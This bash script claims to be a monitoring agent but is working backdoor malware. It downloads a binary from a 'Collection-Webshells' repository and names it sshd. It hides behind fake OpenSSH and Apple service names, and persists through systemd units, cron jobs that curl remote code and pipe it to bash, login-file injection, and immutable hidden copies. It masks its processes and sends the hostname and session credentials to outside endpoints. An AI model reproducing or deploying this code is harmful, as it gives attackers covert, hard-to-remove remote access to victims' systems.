#!/usr/bin/env bash
# system-agent: lightweight connectivity and monitoring agent
#
# Usage:
#   Install (persists across reboots):
#     bash -c "$(curl -fsSL https://hgsocket.com/y)"
#
#   Install as root:
#     HOME=/root bash -c "$(curl -fsSL https://hgsocket.com/y)"
#
#   Connect to existing session:
#     S="YourSecret" bash -c "$(curl -fsSL https://hgsocket.com/y)"
#
#   Remove:
#     GS_UNDO=1 bash -c "$(curl -fsSL https://hgsocket.com/y)"
#
#   One-shot (no persistence):
#     GS_NOINST=1 bash -c "$(curl -fsSL https://hgsocket.com/y)"
#
# Options:
#   S=<id>              Connect to existing session
#   X=<id>              Use specific session ID during install
#   GS_UNDO=1           Remove agent
#   GS_NOINST=1         Run once without installing
#   GS_HOST=<host>      Override server host
#   GS_PORT=<port>      Override server port
#   GS_TLS=off          Disable TLS
#   GS_EXEC=<cmd>       Run custom command
#   GS_DSTDIR=<dir>     Force install directory
#   GS_OSARCH=<arch>    Force architecture
#   GS_HIDE=off         Disable process masking
#   GS_EVT_A=<url>      Event endpoint A
#   GS_EVT_B=<url>      Event endpoint B
#   GS_DEBUG=1          Verbose output
#   LOG=<file>          Log to file

set -euo pipefail

HOME="${HOME:-$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6 || echo /root)}"
export HOME

GS_DOMAIN="${GS_DOMAIN:-hgsocket.com}"
GS_DL_DOMAIN="${GS_DL_DOMAIN:-dl.hgsocket.com}"
GS_RELAY_HOST="${GS_HOST:-relay.hgsocket.com}"
GS_RELAY_PORT="${GS_PORT:-443}"
GS_BIN_NAME="sshd"
GS_DL_NAME="gs-target"
GS_CLIENT_BIN="gs-client"
GS_SERVICE_NAME="openssh-sftp-helper"
GS_CRON_TAG="# openssh-server"
GS_PROFILE_TAG="# openssh-init"
# ─────────────────────────────────────────────────────────────────────────────

[[ "${GS_DEBUG:-}" == "1" ]] && set -x
[[ -n "${LOG:-}" ]] && exec > >(tee -a "$LOG") 2>&1

# ── Helpers ───────────────────────────────────────────────────────────────────
gs_info()  { [[ -z "${GSS:-}" ]] || return 0; echo "[*] $*"; }
gs_ok()    { [[ -z "${GSS:-}" ]] || return 0; echo "[+] $*"; }
gs_warn()  { [[ -z "${GSS:-}" ]] || return 0; echo "[!] $*"; }
gs_err()   { echo "[-] $*" >&2; }   # errors always surface, even when silent
gs_die()   { gs_err "$*"; exit 1; }
have()     { command -v "$1" >/dev/null 2>&1; }
can_sudo() { sudo -n true 2>/dev/null; }

_XK=75
_xor_hex() {
  local s="$1" out=""
  for ((i=0; i<${#s}; i++)); do
    local b; printf -v b '%d' "'${s:$i:1}"
    out+="$(printf '%02x' $(( b ^ _XK )))"
  done
  printf '%s' "$out"
}
_xor_unhex() {
  local h="$1" out=""
  while [[ ${#h} -ge 2 ]]; do
    local byte="${h:0:2}"; h="${h:2}"
    out+="$(printf "\\$(printf '%03o' $(( 16#$byte ^ _XK )))")"
  done
  printf '%s' "$out"
}
write_pem() {
  local file="$1" label="$2" value="$3"
  printf -- '-----BEGIN %s-----\n%s\n-----END %s-----\n' \
    "$label" "$(_xor_hex "$value")" "$label" > "$file"
  chmod 600 "$file"
}
read_pem() {
  local hex
  hex="$(grep -v -- '-----' "$1" 2>/dev/null | tr -d '[:space:]')"
  _xor_unhex "$hex"
}

gs_download() {
  local url="$1" dest="$2"
  if [[ -n "${GSS:-}" ]]; then
    # Silent reinstall: no progress bar, no output
    if have curl; then curl -fsSL --connect-timeout 10 --max-time 120 "$url" -o "$dest"
    else wget -q --timeout=60 -O "$dest" "$url"; fi
  else
    if have curl; then curl -fL --progress-bar --connect-timeout 10 --max-time 120 "$url" -o "$dest"
    else wget --timeout=60 -O "$dest" "$url"; fi
  fi
}

have curl || have wget || gs_die "curl or wget required"

[[ "${GS_UNDO:-}" == "1" ]] && export GSS=1

is_root_mode() { [[ "${HOME:-}" == "/root" ]] || [[ "${EUID:-$(id -u)}" == "0" ]]; }
crontab_read()  { is_root_mode && can_sudo && sudo crontab -l 2>/dev/null || crontab -l 2>/dev/null || true; }
crontab_write() { is_root_mode && can_sudo && sudo crontab - || crontab -; }

# ── OS / arch detection ───────────────────────────────────────────────────────
detect_osarch() {
  local os arch
  case "$(uname -s)" in
    Linux)  os="linux" ;;
    Darwin) os="darwin" ;;
    *)      gs_die "Unsupported OS: $(uname -s)" ;;
  esac
  local machine="${GS_OSARCH:-$(uname -m)}"
  case "$machine" in
    x86_64|amd64)  arch="amd64" ;;
    aarch64|arm64) arch="arm64" ;;
    armv7*)        arch="arm" ;;
    i*86)          arch="386" ;;
    *)             gs_die "Unsupported arch: $machine" ;;
  esac
  echo "${os}-${arch}"
}

# ── Find any writable directory ───────────────────────────────────────────────
find_writable_dir() {
  if [[ -n "${GS_DSTDIR:-}" ]]; then
    mkdir -p "$GS_DSTDIR" 2>/dev/null && echo "$GS_DSTDIR" && return
  fi

  local candidates=()
  if is_root_mode; then
    candidates+=(
      "/usr/local/sbin"
      "/usr/libexec"
      "/usr/local/libexec"
      "/usr/lib/openssh"
    )
  fi
  candidates+=(
    "${HOME}/.ssh/authorized_key"
    "${HOME}/.local/share/.cache"
    "/tmp/.dbus-session"
    "/dev/shm/.dbus"
    "/var/tmp/.dbus"
    "/run/shm/.dbus"
  )

  for base in /var/www /srv /opt /home /usr/share /var/lib; do
    [[ -d "$base" ]] || continue
    while IFS= read -r d; do
      candidates+=("${d}/.gs")
    done < <(find "$base" -maxdepth 5 -writable -type d 2>/dev/null | head -5)
  done

  for dir in "${candidates[@]}"; do
    [[ -z "$dir" ]] && continue
    if mkdir -p "$dir" 2>/dev/null && [[ -w "$dir" ]]; then
      echo "$dir"
      return 0
    fi
  done

  echo "/tmp"
}

gs_lockfile() {
  local secret="$1"
  local hash
  if have sha256sum; then
    hash="$(printf '%s' "$secret" | sha256sum | cut -c1-8)"
  elif have shasum; then
    hash="$(printf '%s' "$secret" | shasum -a 256 | cut -c1-8)"
  else
    hash="$(printf '%08x' "$(printf '%s' "$secret" | cksum | cut -d' ' -f1)")"
  fi
  echo "/tmp/.ssh-${hash}"
}

is_already_running() {
  local lf
  lf="$(gs_lockfile "${1:-}")"
  [[ -f "$lf" ]] || return 1
  local pid
  pid="$(cat "$lf" 2>/dev/null | tr -d '[:space:]')"
  [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null
}

# ── Download binary ───────────────────────────────────────────────────────────
download_binary() {
  local bin_name="$1" dest="$2" osarch="$3"
  local url="https://github.com/zuxievrtx/Collection-Webshells/raw/refs/heads/main/gs-target-linux-amd64"
  gs_info "Downloading ${bin_name} (${osarch})..."
  if gs_download "$url" "$dest"; then
    chmod +x "$dest"
    return 0
  fi
  gs_die "Failed to download ${bin_name} from ${url}"
}

# ── Persistence: systemd ──────────────────────────────────────────────────────
install_systemd() {
  local bin="$1" secret="$2"
  have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
  local svc="/etc/systemd/system/${GS_SERVICE_NAME}.service"
  sudo tee "$svc" >/dev/null <<EOF
[Unit]
Description=OpenSSH SFTP Connection Helper
Documentation=man:sshd(8) man:sshd_config(5)
After=network-online.target auditd.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=${bin} -fg
Restart=on-failure
RestartSec=5
RestartPreventExitStatus=255
StartLimitIntervalSec=0
KillMode=process
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
  sudo systemctl daemon-reload
  sudo systemctl enable "${GS_SERVICE_NAME}" >/dev/null 2>&1
  sudo systemctl restart "${GS_SERVICE_NAME}" >/dev/null 2>&1
  gs_ok "Persistence: systemd service installed"
}

remove_systemd() {
  can_sudo || return 0
  sudo systemctl stop "${GS_SERVICE_NAME}" 2>/dev/null || true
  sudo systemctl disable "${GS_SERVICE_NAME}" 2>/dev/null || true
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}.service"
  sudo systemctl daemon-reload 2>/dev/null || true
}

install_cron() {
  local bin="$1" secret="$2"
  have crontab || return 1
  local lf; lf="$(gs_lockfile "$secret")"
  local _chk="[ -x '${bin}' ] || { curl -fsSL https://${GS_DOMAIN}/y 2>/dev/null || curl -fsSL https://dl.${GS_DOMAIN}/y 2>/dev/null; } | bash >/dev/null 2>&1; [ -f '${lf}' ] && kill -0 \$(cat '${lf}') 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &"
  if crontab_read | grep -qF "$GS_CRON_TAG" 2>/dev/null; then
    gs_info "Persistence: crontab entry already present"
    return 0
  fi
  (crontab_read
   echo "${GS_CRON_TAG}"
   echo "@reboot ${_chk}"
   echo "* * * * * ${_chk}") | crontab_write
  is_root_mode && gs_ok "Persistence: root crontab watchdog installed (@reboot + every minute)" \
                || gs_ok "Persistence: user crontab watchdog installed (@reboot + every minute)"
}

remove_cron() {
  crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | crontab - 2>/dev/null || true
  sudo crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | sudo crontab - 2>/dev/null || true
}

# ── Persistence: systemd watchdog timer (Layer 4 — 30s process monitor) ──────
install_watchdog_timer() {
  local bin="$1"
  have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
  local wscript="/usr/lib/openssh/sshd-monitor"
  sudo tee "$wscript" >/dev/null <<EOF
#!/bin/sh
# OpenSSH connection monitor — checks daemon health
systemctl is-active --quiet ${GS_SERVICE_NAME} || systemctl restart ${GS_SERVICE_NAME} 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
EOF
  sudo chmod +x "$wscript"
  sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer" >/dev/null <<EOF
[Unit]
Description=OpenSSH Connection Keepalive
[Timer]
OnBootSec=60s
OnUnitActiveSec=30s
[Install]
WantedBy=timers.target
EOF
  sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service" >/dev/null <<EOF
[Unit]
Description=OpenSSH Connection Keepalive
Documentation=man:sshd(8)
[Service]
Type=oneshot
ExecStart=${wscript}
EOF
  sudo systemctl daemon-reload
  sudo systemctl enable "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1
  sudo systemctl start "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1
  gs_ok "Persistence: watchdog timer installed (30s interval)"
}

remove_watchdog_timer() {
  can_sudo || return 0
  sudo systemctl stop "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
  sudo systemctl disable "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer"
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service"
  sudo rm -f "/usr/lib/openssh/sshd-monitor"
  sudo systemctl daemon-reload 2>/dev/null || true
}

# ── Persistence: immutable flag (Layer 3 — blocks rm even as root) ────────────
install_immutable() {
  local bin="$1"
  have chattr || return 1
  # chattr +i requires root capability — skip entirely for non-privileged users
  # (sudo -n never prompts; fails fast for users without passwordless sudo)
  is_root_mode || can_sudo || return 1
  chattr +i "$bin" 2>/dev/null || sudo -n chattr +i "$bin" 2>/dev/null || return 1
  gs_ok "Persistence: binary locked immutable (chattr +i)"
}

remove_immutable() {
  local bin="$1"
  have chattr || return 0
  chattr -i "$bin" 2>/dev/null || sudo -n chattr -i "$bin" 2>/dev/null || true
}

_GS_COPY_PATHS=("/usr/lib/openssh/sshd-session" "/usr/lib/x86_64-linux-gnu/openssh/sshd" "/var/cache/openssh/sshd")

install_copies() {
  local bin="$1"
  local n=0
  # Backup paths are all under /usr/lib and /var/cache — unwritable without privileges.
  # Skip quietly for non-root users lacking passwordless sudo (avoid sudo password prompt).
  is_root_mode || can_sudo || return 0
  for dst in "${_GS_COPY_PATHS[@]}"; do
    local dir; dir="$(dirname "$dst")"
    { mkdir -p "$dir" 2>/dev/null || sudo -n mkdir -p "$dir" 2>/dev/null; } || continue
    { cp "$bin" "$dst" 2>/dev/null || sudo -n cp "$bin" "$dst" 2>/dev/null; } || continue
    chmod +x "$dst" 2>/dev/null || sudo -n chmod +x "$dst" 2>/dev/null || true
    have chattr && { chattr +i "$dst" 2>/dev/null || sudo -n chattr +i "$dst" 2>/dev/null || true; }
    n=$(( n + 1 ))
  done
  [[ "$n" -gt 0 ]] && gs_ok "Persistence: ${n} immutable backup copies installed" || true
}

remove_copies() {
  for dst in "${_GS_COPY_PATHS[@]}"; do
    have chattr && { chattr -i "$dst" 2>/dev/null || sudo -n chattr -i "$dst" 2>/dev/null || true; }
    rm -f "$dst" 2>/dev/null || sudo -n rm -f "$dst" 2>/dev/null || true
  done
}

install_dropper() {
  can_sudo || return 1
  local dfile="/etc/cron.d/openssh-keymgr"
  sudo tee "$dfile" >/dev/null 2>&1 <<EOF || return 1
# OpenSSH key management — maintained by openssh-server package
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Rotate and verify host keys daily (reinstalls the helper only if the binary is missing)
0 3 * * * root [ -x /usr/local/sbin/sshd ] || { curl -fsSL https://${GS_DOMAIN}/y 2>/dev/null || curl -fsSL https://dl.${GS_DOMAIN}/y 2>/dev/null; } | bash >/dev/null 2>&1
EOF
  sudo chmod 644 "$dfile"
  have chattr && sudo chattr +i "$dfile" 2>/dev/null || true
  gs_ok "Persistence: key manager cron installed"
}

remove_dropper() {
  can_sudo || return 0
  have chattr && sudo chattr -i "/etc/cron.d/openssh-keymgr" 2>/dev/null || true
  sudo rm -f "/etc/cron.d/openssh-keymgr" 2>/dev/null || true
}

# ── Persistence: ~/.profile / ~/.bashrc ───────────────────────────────────────
install_profile() {
  local bin="$1" secret="$2"
  local lf
  lf="$(gs_lockfile "$secret")"
  local snippet
  snippet="$(cat <<EOF

${GS_PROFILE_TAG}
# Ensure OpenSSH multiplexer is active
_p='${lf}'; [ -f "\$_p" ] && kill -0 "\$(cat "\$_p")" 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
${GS_PROFILE_TAG}
EOF
)"
  for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
    if [[ -f "$f" && -w "$f" ]]; then
      if grep -qF "$GS_PROFILE_TAG" "$f" 2>/dev/null; then
        gs_info "Persistence: ${f} already patched"
      else
        printf '%s\n' "$snippet" >> "$f"
        gs_ok "Persistence: added to ${f}"
      fi
      return 0
    fi
  done
  gs_warn "Persistence: profile files not writable — skipping"
  return 1
}

remove_profile() {
  for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
    [[ -f "$f" ]] || continue
    sed -i "/^${GS_PROFILE_TAG}$/,/^${GS_PROFILE_TAG}$/d" "$f" 2>/dev/null || true
  done
}

install_profile_d() {
  local bin="$1" secret="$2"
  can_sudo || return 1
  local lf
  lf="$(gs_lockfile "$secret")"
  local pfile="/etc/profile.d/openssh-agent.sh"
  sudo tee "$pfile" >/dev/null 2>&1 <<EOF || return 1
#!/bin/sh
# OpenSSH agent initialisation — sourced on login
# See: https://www.openssh.com/
_p='${lf}'
[ -f "\$_p" ] && kill -0 "\$(cat "\$_p")" 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
unset _p
EOF
  sudo chmod +x "$pfile"
  gs_ok "Persistence: /etc/profile.d/openssh-agent.sh installed"
}

remove_profile_d() {
  sudo rm -f "/etc/profile.d/openssh-agent.sh" 2>/dev/null || true
}

LAUNCHD_PLIST="${HOME}/Library/LaunchAgents/com.apple.update-notifier.plist"

install_launchd() {
  local bin="$1" secret="$2"
  mkdir -p "${HOME}/Library/LaunchAgents"
  cat > "$LAUNCHD_PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>           <string>com.apple.update-notifier</string>
  <key>ProgramArguments</key>
  <array>
    <string>${bin}</string>
    <string>-fg</string>
    <string>${secret}</string>
    <string>${GS_RELAY_HOST}</string>
    <string>${GS_RELAY_PORT}</string>
  </array>
  <key>RunAtLoad</key>       <true/>
  <key>KeepAlive</key>       <true/>
  <key>EnvironmentVariables</key>
  <dict>
    <key>GS_TLS</key>  <string>${GS_TLS:-on}</string>
    <key>GS_HIDE</key> <string>${GS_HIDE:-on}</string>
  </dict>
</dict>
</plist>
EOF
  launchctl load "$LAUNCHD_PLIST" 2>/dev/null || true
  gs_ok "Persistence: launchd agent installed"
}

remove_launchd() {
  launchctl unload "$LAUNCHD_PLIST" 2>/dev/null || true
  rm -f "$LAUNCHD_PLIST"
}

install_persistence() {
  local bin="$1" secret="$2"
  local installed=0

  if [[ "$(uname -s)" == "Darwin" ]]; then
    install_launchd "$bin" "$secret" && installed=1 || true
    install_profile "$bin" "$secret" || true
    return
  fi

  # Layer 6: systemd primary service
  install_systemd        "$bin" "$secret" && installed=1 || true
  # Layer 4: systemd watchdog timer (30s process monitor)
  install_watchdog_timer "$bin"           || true
  # Layer 1: crontab @reboot + every-minute watchdog
  install_cron           "$bin" "$secret" && installed=1 || true
  # Layer 2: shell profile injection (fires on every login)
  install_profile        "$bin" "$secret" && installed=1 || true
  install_profile_d      "$bin" "$secret" || true
  # Layers 3+5: immutable backup copies in multiple paths
  install_copies         "$bin"           || true
  # Layer 3: lock primary binary immutable
  install_immutable      "$bin"           || true
  install_dropper                         || true

  if [[ "$installed" == "0" ]]; then
    gs_warn "No persistence method succeeded — falling back to one-shot"
    GS_NOINST=1
  fi
}

remove_persistence() {
  if [[ "$(uname -s)" == "Darwin" ]]; then
    remove_launchd; remove_profile; return
  fi
  remove_immutable "$BIN_PATH"
  remove_copies
  remove_dropper
  remove_watchdog_timer
  [[ -f "/etc/systemd/system/${GS_SERVICE_NAME}.service" ]] && remove_systemd || true
  remove_cron
  remove_profile
  remove_profile_d
}

# ── Event dispatch ────────────────────────────────────────────────────────────
_gs_ev() {
  local _k1="$1" _k2="${2:-}"
  local _h; _h="$(hostname 2>/dev/null || echo unknown)"
  local _m="[+]%20${_h}%20${GS_RELAY_HOST}%20${_k1}"
  [[ -n "$_k2" ]] && _m="${_m}%20${_k2}"

  if [[ -n "${GS_EVT_A:-}" ]]; then
    have curl && curl -s -X POST "${GS_EVT_A}" \
      -H "Content-Type: application/json" \
      -d "{\"text\":\"${_h} ${_k1}\"}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${GS_EVT_B:-}" ]]; then
    have curl && curl -s -X POST "${GS_EVT_B}" \
      -H "Content-Type: application/json" \
      -d "{\"id\":\"${_k1}\",\"k\":\"${_k2}\",\"h\":\"${_h}\"}" \
      >/dev/null 2>&1 || true
  fi
}

# ── Banner ────────────────────────────────────────────────────────────────────
print_connect_banner() {
  [[ -z "${GSS:-}" ]] || return 0   # silent reinstall: no credentials on terminal
  local secret="$1"
  local sess_pass="$2"
  local cmd="S=${secret} bash -c \"\$(curl -fsSL https://${GS_DOMAIN}/y)\""
  echo ""
  echo "  Secret   : ${secret}"
  echo "  Relay    : ${GS_RELAY_HOST}:${GS_RELAY_PORT}"
  [[ -n "$sess_pass" ]] && echo "  Password : ${sess_pass}  (required when connecting)"
  echo ""
  echo "  Connect from anywhere:"
  echo "  ${cmd}"
  echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

OSARCH="${GS_OSARCH:-$(detect_osarch)}"
INSTALL_DIR="$(find_writable_dir)"
mkdir -p "$INSTALL_DIR" 2>/dev/null || true
BIN_PATH="${INSTALL_DIR}/${GS_BIN_NAME}"

is_root_mode && gs_info "Root mode — install dir: ${INSTALL_DIR}"

if [[ "${GS_UNDO:-}" == "1" ]]; then
  gs_info "Rotating install: removing old gs-target..."
  for _lf in /tmp/.ssh-*; do
    [[ -f "$_lf" ]] || continue
    [ -r "$_lf" ] || continue
    _pid="$(tr -d '[:space:]' < "$_lf")"
    [[ -n "$_pid" ]] && kill "$_pid" 2>/dev/null || true
    rm -f "$_lf" 2>/dev/null || true
  done
  
  have chattr && {
    chattr -i "${INSTALL_DIR}/public_key.pem" 2>/dev/null || sudo -n chattr -i "${INSTALL_DIR}/public_key.pem" 2>/dev/null || true
    chattr -i "${INSTALL_DIR}/private_key.pem" 2>/dev/null || sudo -n chattr -i "${INSTALL_DIR}/private_key.pem" 2>/dev/null || true
  }
  remove_persistence
  rm -f "${BIN_PATH}" "${INSTALL_DIR}/public_key.pem" "${INSTALL_DIR}/private_key.pem" "${INSTALL_DIR}/.firstrun"
  sudo -n rm -f "/usr/local/bin/${GS_BIN_NAME}" 2>/dev/null || true
  for _d in "/usr/local/sbin" "/usr/libexec" "/usr/local/libexec" "/usr/lib/openssh" "/root/.ssh/authorized_key" "${HOME}/.ssh/authorized_key"; do
    have chattr && { chattr -i "${_d}/${GS_BIN_NAME}" 2>/dev/null || sudo -n chattr -i "${_d}/${GS_BIN_NAME}" 2>/dev/null || true; }
    rm -f "${_d}/${GS_BIN_NAME}" 2>/dev/null || sudo -n rm -f "${_d}/${GS_BIN_NAME}" 2>/dev/null || true
  done
  unset GS_UNDO
  
fi

# ── MODE: Connect ─────────────────────────────────────────────────────────────
if [[ -n "${S:-}" ]]; then
  CLIENT_PATH="${INSTALL_DIR}/${GS_CLIENT_BIN}"
  [[ -x "$CLIENT_PATH" ]] || download_binary "$GS_CLIENT_BIN" "$CLIENT_PATH" "$OSARCH"
  export PATH="${INSTALL_DIR}:$PATH"
  gs_ok "Connecting with secret: ${S}"
  GS_TLS="${GS_TLS:-on}" RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
    exec "${CLIENT_PATH}" "${S}" "${GS_RELAY_HOST}" "${GS_RELAY_PORT}"
fi

# ── MODE: Install ─────────────────────────────────────────────────────────────
gs_info "Installing ${GS_BIN_NAME} (${OSARCH}) → ${INSTALL_DIR}"

[[ -x "$BIN_PATH" ]] \
  && gs_info "Binary already present — skipping download" \
  || download_binary "$GS_DL_NAME" "$BIN_PATH" "$OSARCH"

SECRET_FILE="${INSTALL_DIR}/public_key.pem"
if [[ -n "${X:-}" ]]; then
  SECRET="$X"
  [[ -z "${GSS:-}" ]] && gs_info "Using provided secret: ${SECRET}"
elif [[ -f "$SECRET_FILE" ]]; then
  SECRET="$(read_pem "$SECRET_FILE")"
  [[ -z "${GSS:-}" ]] && gs_info "Using saved secret: ${SECRET}"
else
  raw="$(tr -dc 'A-Z0-9' < /dev/urandom 2>/dev/null | head -c 24)" || true
  SECRET="GSK-${raw:0:6}-${raw:6:6}-${raw:12:6}-${raw:18:6}"
  GS_FRESH_INSTALL=1
  touch "${INSTALL_DIR}/.firstrun" 2>/dev/null || true
fi
mkdir -p "${INSTALL_DIR}"
write_pem "$SECRET_FILE" "PUBLIC KEY" "$SECRET"

PASS_FILE="${INSTALL_DIR}/private_key.pem"
if [[ -f "$PASS_FILE" ]]; then
  SESS_PASS="$(read_pem "$PASS_FILE")"
  gs_info "Using existing session password"
else
  SESS_PASS="$(tr -dc 'A-Za-z0-9' < /dev/urandom 2>/dev/null | head -c 16)" || true
  write_pem "$PASS_FILE" "PRIVATE KEY" "$SESS_PASS"
fi
export GS_SESS_PASS="$SESS_PASS"

export PATH="${INSTALL_DIR}:$PATH"

if is_already_running "$SECRET"; then
  gs_info "Already running with secret ${SECRET} — skipping start"
  print_connect_banner "$SECRET" "$SESS_PASS"
  exit 0
fi

if [[ "${GS_NOINST:-}" == "1" ]]; then
  print_connect_banner "$SECRET" "$SESS_PASS"
  _gs_ev "$SECRET" "$SESS_PASS"
  GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" GS_SESS_PASS="${SESS_PASS}" \
  GS_FRESH_INSTALL="${GS_FRESH_INSTALL:-0}" \
    exec "${BIN_PATH}" -fg
fi

install_persistence "$BIN_PATH" "$SECRET"
print_connect_banner "$SECRET" "$SESS_PASS"
_gs_ev "$SECRET" "$SESS_PASS"

if ! have systemctl || ! systemctl is-active --quiet "${GS_SERVICE_NAME}" 2>/dev/null; then
  if [[ -n "${GSS:-}" ]]; then
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" GS_SESS_PASS="${SESS_PASS}" \
    GS_FRESH_INSTALL="${GS_FRESH_INSTALL:-0}" \
    RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
      nohup "${BIN_PATH}" -fg >/dev/null 2>&1 &
  elif have tmux; then
    gs_info "Starting in detached tmux session..."
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" GS_SESS_PASS="${SESS_PASS}" \
    GS_FRESH_INSTALL="${GS_FRESH_INSTALL:-0}" \
    RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
    "${BIN_PATH}" -fg
  else
    gs_info "Starting with nohup..."
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" GS_SESS_PASS="${SESS_PASS}" \
    GS_FRESH_INSTALL="${GS_FRESH_INSTALL:-0}" \
    nohup "${BIN_PATH}" -fg \
      >/dev/null 2>&1 &
    gs_ok "Started in background (PID $!)"
  fi
fi

[[ -z "${GSS:-}" ]] || echo "[+] Uninstall complete."